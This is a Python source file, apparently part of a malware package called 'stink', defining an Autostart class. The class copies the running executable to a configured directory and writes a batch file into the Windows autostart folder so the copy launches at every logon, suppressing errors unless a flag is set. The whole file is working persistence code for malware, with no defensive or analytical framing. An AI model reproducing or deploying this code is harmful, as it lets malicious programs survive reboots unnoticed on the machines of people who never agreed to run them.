from shutil import copyfile

from stink.helpers.config import AutostartConfig


class Autostart:

    def __init__(self, executor_path: str, errors: bool):

        self.config = AutostartConfig()

        self.executor_path = executor_path
        self.errors = errors

    def __create_copy(self):

        self.executor_name = self.executor_path.replace("\\", "/").split("/")[-1]
        copyfile(self.executor_path, rf"{self.config.ExecutorPath}\{self.executor_name}")

    def __add_to_autostart(self):

        with open(rf"{self.config.AutostartPath}\{self.config.AutostartName}.bat", "w+") as file:
            file.write(f'@echo off\nstart "{self.config.AutostartName}" "{self.config.ExecutorPath}\\{self.executor_name}"')

    def run(self):

        try:

            self.__create_copy()
            self.__add_to_autostart()

        except Exception as e:
            if self.errors is True: print(f"[Autostart]: {repr(e)}")
